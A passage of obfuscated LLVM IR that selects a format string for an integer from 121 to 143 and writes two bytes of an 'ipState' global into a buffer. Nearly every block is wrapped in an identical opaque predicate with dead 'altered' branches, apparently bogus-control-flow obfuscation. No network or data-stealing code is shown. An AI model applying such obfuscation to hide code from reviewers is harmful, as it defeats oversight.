originalBB278:                                    ; preds = %originalBB278alteredBB, %2356
  %2365 = load i32, i32* %1, align 4
  %2366 = icmp eq i32 %2365, 121
  %2367 = load i32, i32* @x.65
  %2368 = load i32, i32* @y.66
  %2369 = sub i32 %2367, 1
  %2370 = mul i32 %2367, %2369
  %2371 = urem i32 %2370, 2
  %2372 = icmp eq i32 %2371, 0
  %2373 = icmp slt i32 %2368, 10
  %2374 = or i1 %2372, %2373
  br i1 %2374, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %2366, label %2375, label %2382

; <label>:2375:                                   ; preds = %originalBBpart2280
  %2376 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2378 = zext i8 %2377 to i32
  %2379 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2380 = zext i8 %2379 to i32
  %2381 = call i32 (i8*, i8*, ...) @szprintf(i8* %2376, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.789, i32 0, i32 0), i32 %2378, i32 %2380)
  br label %2382

; <label>:2382:                                   ; preds = %2375, %originalBBpart2280
  %2383 = load i32, i32* %1, align 4
  %2384 = icmp eq i32 %2383, 122
  br i1 %2384, label %2385, label %2392

; <label>:2385:                                   ; preds = %2382
  %2386 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2387 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2388 = zext i8 %2387 to i32
  %2389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2390 = zext i8 %2389 to i32
  %2391 = call i32 (i8*, i8*, ...) @szprintf(i8* %2386, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.790, i32 0, i32 0), i32 %2388, i32 %2390)
  br label %2392

; <label>:2392:                                   ; preds = %2385, %2382
  %2393 = load i32, i32* %1, align 4
  %2394 = icmp eq i32 %2393, 123
  br i1 %2394, label %2395, label %2418

; <label>:2395:                                   ; preds = %2392
  %2396 = load i32, i32* @x.65
  %2397 = load i32, i32* @y.66
  %2398 = sub i32 %2396, 1
  %2399 = mul i32 %2396, %2398
  %2400 = urem i32 %2399, 2
  %2401 = icmp eq i32 %2400, 0
  %2402 = icmp slt i32 %2397, 10
  %2403 = or i1 %2401, %2402
  br i1 %2403, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2395
  %2404 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2405 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2406 = zext i8 %2405 to i32
  %2407 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2408 = zext i8 %2407 to i32
  %2409 = call i32 (i8*, i8*, ...) @szprintf(i8* %2404, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.791, i32 0, i32 0), i32 %2406, i32 %2408)
  %2410 = load i32, i32* @x.65
  %2411 = load i32, i32* @y.66
  %2412 = sub i32 %2410, 1
  %2413 = mul i32 %2410, %2412
  %2414 = urem i32 %2413, 2
  %2415 = icmp eq i32 %2414, 0
  %2416 = icmp slt i32 %2411, 10
  %2417 = or i1 %2415, %2416
  br i1 %2417, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br label %2418

; <label>:2418:                                   ; preds = %originalBBpart2284, %2392
  %2419 = load i32, i32* %1, align 4
  %2420 = icmp eq i32 %2419, 124
  br i1 %2420, label %2421, label %2428

; <label>:2421:                                   ; preds = %2418
  %2422 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2423 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2424 = zext i8 %2423 to i32
  %2425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2426 = zext i8 %2425 to i32
  %2427 = call i32 (i8*, i8*, ...) @szprintf(i8* %2422, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.792, i32 0, i32 0), i32 %2424, i32 %2426)
  br label %2428

; <label>:2428:                                   ; preds = %2421, %2418
  %2429 = load i32, i32* @x.65
  %2430 = load i32, i32* @y.66
  %2431 = sub i32 %2429, 1
  %2432 = mul i32 %2429, %2431
  %2433 = urem i32 %2432, 2
  %2434 = icmp eq i32 %2433, 0
  %2435 = icmp slt i32 %2430, 10
  %2436 = or i1 %2434, %2435
  br i1 %2436, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2428
  %2437 = load i32, i32* %1, align 4
  %2438 = icmp eq i32 %2437, 125
  %2439 = load i32, i32* @x.65
  %2440 = load i32, i32* @y.66
  %2441 = sub i32 %2439, 1
  %2442 = mul i32 %2439, %2441
  %2443 = urem i32 %2442, 2
  %2444 = icmp eq i32 %2443, 0
  %2445 = icmp slt i32 %2440, 10
  %2446 = or i1 %2444, %2445
  br i1 %2446, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %2438, label %2447, label %2470

; <label>:2447:                                   ; preds = %originalBBpart2288
  %2448 = load i32, i32* @x.65
  %2449 = load i32, i32* @y.66
  %2450 = sub i32 %2448, 1
  %2451 = mul i32 %2448, %2450
  %2452 = urem i32 %2451, 2
  %2453 = icmp eq i32 %2452, 0
  %2454 = icmp slt i32 %2449, 10
  %2455 = or i1 %2453, %2454
  br i1 %2455, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2447
  %2456 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2458 = zext i8 %2457 to i32
  %2459 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2460 = zext i8 %2459 to i32
  %2461 = call i32 (i8*, i8*, ...) @szprintf(i8* %2456, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.793, i32 0, i32 0), i32 %2458, i32 %2460)
  %2462 = load i32, i32* @x.65
  %2463 = load i32, i32* @y.66
  %2464 = sub i32 %2462, 1
  %2465 = mul i32 %2462, %2464
  %2466 = urem i32 %2465, 2
  %2467 = icmp eq i32 %2466, 0
  %2468 = icmp slt i32 %2463, 10
  %2469 = or i1 %2467, %2468
  br i1 %2469, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br label %2470

; <label>:2470:                                   ; preds = %originalBBpart2292, %originalBBpart2288
  %2471 = load i32, i32* @x.65
  %2472 = load i32, i32* @y.66
  %2473 = sub i32 %2471, 1
  %2474 = mul i32 %2471, %2473
  %2475 = urem i32 %2474, 2
  %2476 = icmp eq i32 %2475, 0
  %2477 = icmp slt i32 %2472, 10
  %2478 = or i1 %2476, %2477
  br i1 %2478, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2470
  %2479 = load i32, i32* %1, align 4
  %2480 = icmp eq i32 %2479, 126
  %2481 = load i32, i32* @x.65
  %2482 = load i32, i32* @y.66
  %2483 = sub i32 %2481, 1
  %2484 = mul i32 %2481, %2483
  %2485 = urem i32 %2484, 2
  %2486 = icmp eq i32 %2485, 0
  %2487 = icmp slt i32 %2482, 10
  %2488 = or i1 %2486, %2487
  br i1 %2488, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %2480, label %2489, label %2496

; <label>:2489:                                   ; preds = %originalBBpart2296
  %2490 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2492 = zext i8 %2491 to i32
  %2493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2494 = zext i8 %2493 to i32
  %2495 = call i32 (i8*, i8*, ...) @szprintf(i8* %2490, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.794, i32 0, i32 0), i32 %2492, i32 %2494)
  br label %2496

; <label>:2496:                                   ; preds = %2489, %originalBBpart2296
  %2497 = load i32, i32* @x.65
  %2498 = load i32, i32* @y.66
  %2499 = sub i32 %2497, 1
  %2500 = mul i32 %2497, %2499
  %2501 = urem i32 %2500, 2
  %2502 = icmp eq i32 %2501, 0
  %2503 = icmp slt i32 %2498, 10
  %2504 = or i1 %2502, %2503
  br i1 %2504, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %2496
  %2505 = load i32, i32* %1, align 4
  %2506 = icmp eq i32 %2505, 127
  %2507 = load i32, i32* @x.65
  %2508 = load i32, i32* @y.66
  %2509 = sub i32 %2507, 1
  %2510 = mul i32 %2507, %2509
  %2511 = urem i32 %2510, 2
  %2512 = icmp eq i32 %2511, 0
  %2513 = icmp slt i32 %2508, 10
  %2514 = or i1 %2512, %2513
  br i1 %2514, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2506, label %2515, label %2522

; <label>:2515:                                   ; preds = %originalBBpart2300
  %2516 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2518 = zext i8 %2517 to i32
  %2519 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2520 = zext i8 %2519 to i32
  %2521 = call i32 (i8*, i8*, ...) @szprintf(i8* %2516, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.784, i32 0, i32 0), i32 %2518, i32 %2520)
  br label %2522

; <label>:2522:                                   ; preds = %2515, %originalBBpart2300
  %2523 = load i32, i32* @x.65
  %2524 = load i32, i32* @y.66
  %2525 = sub i32 %2523, 1
  %2526 = mul i32 %2523, %2525
  %2527 = urem i32 %2526, 2
  %2528 = icmp eq i32 %2527, 0
  %2529 = icmp slt i32 %2524, 10
  %2530 = or i1 %2528, %2529
  br i1 %2530, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2522
  %2531 = load i32, i32* %1, align 4
  %2532 = icmp eq i32 %2531, 128
  %2533 = load i32, i32* @x.65
  %2534 = load i32, i32* @y.66
  %2535 = sub i32 %2533, 1
  %2536 = mul i32 %2533, %2535
  %2537 = urem i32 %2536, 2
  %2538 = icmp eq i32 %2537, 0
  %2539 = icmp slt i32 %2534, 10
  %2540 = or i1 %2538, %2539
  br i1 %2540, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br i1 %2532, label %2541, label %2564

; <label>:2541:                                   ; preds = %originalBBpart2304
  %2542 = load i32, i32* @x.65
  %2543 = load i32, i32* @y.66
  %2544 = sub i32 %2542, 1
  %2545 = mul i32 %2542, %2544
  %2546 = urem i32 %2545, 2
  %2547 = icmp eq i32 %2546, 0
  %2548 = icmp slt i32 %2543, 10
  %2549 = or i1 %2547, %2548
  br i1 %2549, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2541
  %2550 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2552 = zext i8 %2551 to i32
  %2553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2554 = zext i8 %2553 to i32
  %2555 = call i32 (i8*, i8*, ...) @szprintf(i8* %2550, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.795, i32 0, i32 0), i32 %2552, i32 %2554)
  %2556 = load i32, i32* @x.65
  %2557 = load i32, i32* @y.66
  %2558 = sub i32 %2556, 1
  %2559 = mul i32 %2556, %2558
  %2560 = urem i32 %2559, 2
  %2561 = icmp eq i32 %2560, 0
  %2562 = icmp slt i32 %2557, 10
  %2563 = or i1 %2561, %2562
  br i1 %2563, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br label %2564

; <label>:2564:                                   ; preds = %originalBBpart2308, %originalBBpart2304
  %2565 = load i32, i32* %1, align 4
  %2566 = icmp eq i32 %2565, 129
  br i1 %2566, label %2567, label %2574

; <label>:2567:                                   ; preds = %2564
  %2568 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2569 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2570 = zext i8 %2569 to i32
  %2571 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2572 = zext i8 %2571 to i32
  %2573 = call i32 (i8*, i8*, ...) @szprintf(i8* %2568, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.796, i32 0, i32 0), i32 %2570, i32 %2572)
  br label %2574

; <label>:2574:                                   ; preds = %2567, %2564
  %2575 = load i32, i32* %1, align 4
  %2576 = icmp eq i32 %2575, 130
  br i1 %2576, label %2577, label %2600

; <label>:2577:                                   ; preds = %2574
  %2578 = load i32, i32* @x.65
  %2579 = load i32, i32* @y.66
  %2580 = sub i32 %2578, 1
  %2581 = mul i32 %2578, %2580
  %2582 = urem i32 %2581, 2
  %2583 = icmp eq i32 %2582, 0
  %2584 = icmp slt i32 %2579, 10
  %2585 = or i1 %2583, %2584
  br i1 %2585, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2577
  %2586 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2587 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2588 = zext i8 %2587 to i32
  %2589 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2590 = zext i8 %2589 to i32
  %2591 = call i32 (i8*, i8*, ...) @szprintf(i8* %2586, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.790, i32 0, i32 0), i32 %2588, i32 %2590)
  %2592 = load i32, i32* @x.65
  %2593 = load i32, i32* @y.66
  %2594 = sub i32 %2592, 1
  %2595 = mul i32 %2592, %2594
  %2596 = urem i32 %2595, 2
  %2597 = icmp eq i32 %2596, 0
  %2598 = icmp slt i32 %2593, 10
  %2599 = or i1 %2597, %2598
  br i1 %2599, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br label %2600

; <label>:2600:                                   ; preds = %originalBBpart2312, %2574
  %2601 = load i32, i32* %1, align 4
  %2602 = icmp eq i32 %2601, 131
  br i1 %2602, label %2603, label %2610

; <label>:2603:                                   ; preds = %2600
  %2604 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2606 = zext i8 %2605 to i32
  %2607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2608 = zext i8 %2607 to i32
  %2609 = call i32 (i8*, i8*, ...) @szprintf(i8* %2604, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.797, i32 0, i32 0), i32 %2606, i32 %2608)
  br label %2610

; <label>:2610:                                   ; preds = %2603, %2600
  %2611 = load i32, i32* %1, align 4
  %2612 = icmp eq i32 %2611, 132
  br i1 %2612, label %2613, label %2620

; <label>:2613:                                   ; preds = %2610
  %2614 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2615 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2616 = zext i8 %2615 to i32
  %2617 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2618 = zext i8 %2617 to i32
  %2619 = call i32 (i8*, i8*, ...) @szprintf(i8* %2614, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.798, i32 0, i32 0), i32 %2616, i32 %2618)
  br label %2620

; <label>:2620:                                   ; preds = %2613, %2610
  %2621 = load i32, i32* %1, align 4
  %2622 = icmp eq i32 %2621, 133
  br i1 %2622, label %2623, label %2630

; <label>:2623:                                   ; preds = %2620
  %2624 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2625 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2626 = zext i8 %2625 to i32
  %2627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2628 = zext i8 %2627 to i32
  %2629 = call i32 (i8*, i8*, ...) @szprintf(i8* %2624, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.799, i32 0, i32 0), i32 %2626, i32 %2628)
  br label %2630

; <label>:2630:                                   ; preds = %2623, %2620
  %2631 = load i32, i32* %1, align 4
  %2632 = icmp eq i32 %2631, 134
  br i1 %2632, label %2633, label %2640

; <label>:2633:                                   ; preds = %2630
  %2634 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2635 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2636 = zext i8 %2635 to i32
  %2637 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2638 = zext i8 %2637 to i32
  %2639 = call i32 (i8*, i8*, ...) @szprintf(i8* %2634, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.800, i32 0, i32 0), i32 %2636, i32 %2638)
  br label %2640

; <label>:2640:                                   ; preds = %2633, %2630
  %2641 = load i32, i32* %1, align 4
  %2642 = icmp eq i32 %2641, 135
  br i1 %2642, label %2643, label %2650

; <label>:2643:                                   ; preds = %2640
  %2644 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2645 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2646 = zext i8 %2645 to i32
  %2647 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2648 = zext i8 %2647 to i32
  %2649 = call i32 (i8*, i8*, ...) @szprintf(i8* %2644, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.801, i32 0, i32 0), i32 %2646, i32 %2648)
  br label %2650

; <label>:2650:                                   ; preds = %2643, %2640
  %2651 = load i32, i32* %1, align 4
  %2652 = icmp eq i32 %2651, 136
  br i1 %2652, label %2653, label %2660

; <label>:2653:                                   ; preds = %2650
  %2654 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2655 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2656 = zext i8 %2655 to i32
  %2657 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2658 = zext i8 %2657 to i32
  %2659 = call i32 (i8*, i8*, ...) @szprintf(i8* %2654, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.802, i32 0, i32 0), i32 %2656, i32 %2658)
  br label %2660

; <label>:2660:                                   ; preds = %2653, %2650
  %2661 = load i32, i32* @x.65
  %2662 = load i32, i32* @y.66
  %2663 = sub i32 %2661, 1
  %2664 = mul i32 %2661, %2663
  %2665 = urem i32 %2664, 2
  %2666 = icmp eq i32 %2665, 0
  %2667 = icmp slt i32 %2662, 10
  %2668 = or i1 %2666, %2667
  br i1 %2668, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2660
  %2669 = load i32, i32* %1, align 4
  %2670 = icmp eq i32 %2669, 137
  %2671 = load i32, i32* @x.65
  %2672 = load i32, i32* @y.66
  %2673 = sub i32 %2671, 1
  %2674 = mul i32 %2671, %2673
  %2675 = urem i32 %2674, 2
  %2676 = icmp eq i32 %2675, 0
  %2677 = icmp slt i32 %2672, 10
  %2678 = or i1 %2676, %2677
  br i1 %2678, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br i1 %2670, label %2679, label %2702

; <label>:2679:                                   ; preds = %originalBBpart2316
  %2680 = load i32, i32* @x.65
  %2681 = load i32, i32* @y.66
  %2682 = sub i32 %2680, 1
  %2683 = mul i32 %2680, %2682
  %2684 = urem i32 %2683, 2
  %2685 = icmp eq i32 %2684, 0
  %2686 = icmp slt i32 %2681, 10
  %2687 = or i1 %2685, %2686
  br i1 %2687, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2679
  %2688 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2689 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2690 = zext i8 %2689 to i32
  %2691 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2692 = zext i8 %2691 to i32
  %2693 = call i32 (i8*, i8*, ...) @szprintf(i8* %2688, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.803, i32 0, i32 0), i32 %2690, i32 %2692)
  %2694 = load i32, i32* @x.65
  %2695 = load i32, i32* @y.66
  %2696 = sub i32 %2694, 1
  %2697 = mul i32 %2694, %2696
  %2698 = urem i32 %2697, 2
  %2699 = icmp eq i32 %2698, 0
  %2700 = icmp slt i32 %2695, 10
  %2701 = or i1 %2699, %2700
  br i1 %2701, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br label %2702

; <label>:2702:                                   ; preds = %originalBBpart2320, %originalBBpart2316
  %2703 = load i32, i32* %1, align 4
  %2704 = icmp eq i32 %2703, 138
  br i1 %2704, label %2705, label %2728

; <label>:2705:                                   ; preds = %2702
  %2706 = load i32, i32* @x.65
  %2707 = load i32, i32* @y.66
  %2708 = sub i32 %2706, 1
  %2709 = mul i32 %2706, %2708
  %2710 = urem i32 %2709, 2
  %2711 = icmp eq i32 %2710, 0
  %2712 = icmp slt i32 %2707, 10
  %2713 = or i1 %2711, %2712
  br i1 %2713, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2705
  %2714 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2715 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2716 = zext i8 %2715 to i32
  %2717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2718 = zext i8 %2717 to i32
  %2719 = call i32 (i8*, i8*, ...) @szprintf(i8* %2714, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.804, i32 0, i32 0), i32 %2716, i32 %2718)
  %2720 = load i32, i32* @x.65
  %2721 = load i32, i32* @y.66
  %2722 = sub i32 %2720, 1
  %2723 = mul i32 %2720, %2722
  %2724 = urem i32 %2723, 2
  %2725 = icmp eq i32 %2724, 0
  %2726 = icmp slt i32 %2721, 10
  %2727 = or i1 %2725, %2726
  br i1 %2727, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %2728

; <label>:2728:                                   ; preds = %originalBBpart2324, %2702
  %2729 = load i32, i32* %1, align 4
  %2730 = icmp eq i32 %2729, 139
  br i1 %2730, label %2731, label %2738

; <label>:2731:                                   ; preds = %2728
  %2732 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2734 = zext i8 %2733 to i32
  %2735 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2736 = zext i8 %2735 to i32
  %2737 = call i32 (i8*, i8*, ...) @szprintf(i8* %2732, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.805, i32 0, i32 0), i32 %2734, i32 %2736)
  br label %2738

; <label>:2738:                                   ; preds = %2731, %2728
  %2739 = load i32, i32* @x.65
  %2740 = load i32, i32* @y.66
  %2741 = sub i32 %2739, 1
  %2742 = mul i32 %2739, %2741
  %2743 = urem i32 %2742, 2
  %2744 = icmp eq i32 %2743, 0
  %2745 = icmp slt i32 %2740, 10
  %2746 = or i1 %2744, %2745
  br i1 %2746, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2738
  %2747 = load i32, i32* %1, align 4
  %2748 = icmp eq i32 %2747, 140
  %2749 = load i32, i32* @x.65
  %2750 = load i32, i32* @y.66
  %2751 = sub i32 %2749, 1
  %2752 = mul i32 %2749, %2751
  %2753 = urem i32 %2752, 2
  %2754 = icmp eq i32 %2753, 0
  %2755 = icmp slt i32 %2750, 10
  %2756 = or i1 %2754, %2755
  br i1 %2756, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %2748, label %2757, label %2764

; <label>:2757:                                   ; preds = %originalBBpart2328
  %2758 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2759 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2760 = zext i8 %2759 to i32
  %2761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2762 = zext i8 %2761 to i32
  %2763 = call i32 (i8*, i8*, ...) @szprintf(i8* %2758, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.806, i32 0, i32 0), i32 %2760, i32 %2762)
  br label %2764

; <label>:2764:                                   ; preds = %2757, %originalBBpart2328
  %2765 = load i32, i32* @x.65
  %2766 = load i32, i32* @y.66
  %2767 = sub i32 %2765, 1
  %2768 = mul i32 %2765, %2767
  %2769 = urem i32 %2768, 2
  %2770 = icmp eq i32 %2769, 0
  %2771 = icmp slt i32 %2766, 10
  %2772 = or i1 %2770, %2771
  br i1 %2772, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2764
  %2773 = load i32, i32* %1, align 4
  %2774 = icmp eq i32 %2773, 141
  %2775 = load i32, i32* @x.65
  %2776 = load i32, i32* @y.66
  %2777 = sub i32 %2775, 1
  %2778 = mul i32 %2775, %2777
  %2779 = urem i32 %2778, 2
  %2780 = icmp eq i32 %2779, 0
  %2781 = icmp slt i32 %2776, 10
  %2782 = or i1 %2780, %2781
  br i1 %2782, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2774, label %2783, label %2790

; <label>:2783:                                   ; preds = %originalBBpart2332
  %2784 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2785 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2786 = zext i8 %2785 to i32
  %2787 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2788 = zext i8 %2787 to i32
  %2789 = call i32 (i8*, i8*, ...) @szprintf(i8* %2784, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.807, i32 0, i32 0), i32 %2786, i32 %2788)
  br label %2790

; <label>:2790:                                   ; preds = %2783, %originalBBpart2332
  %2791 = load i32, i32* %1, align 4
  %2792 = icmp eq i32 %2791, 142
  br i1 %2792, label %2793, label %2800

; <label>:2793:                                   ; preds = %2790
  %2794 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2795 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2796 = zext i8 %2795 to i32
  %2797 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2798 = zext i8 %2797 to i32
  %2799 = call i32 (i8*, i8*, ...) @szprintf(i8* %2794, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.808, i32 0, i32 0), i32 %2796, i32 %2798)
  br label %2800

; <label>:2800:                                   ; preds = %2793, %2790
  %2801 = load i32, i32* %1, align 4
  %2802 = icmp eq i32 %2801, 143
  br i1 %2802, label %2803, label %2810

; <label>:2803:                                   ; preds = %2800
  %2804 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2805 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2806 = zext i8 %2805 to i32
  %2807 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2808 = zext i8 %2807 to i32
  %2809 = call i32 (i8*, i8*, ...) @szprintf(i8* %2804, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.809, i32 0, i32 0), i32 %2806, i32 %2808)
  br label %2810

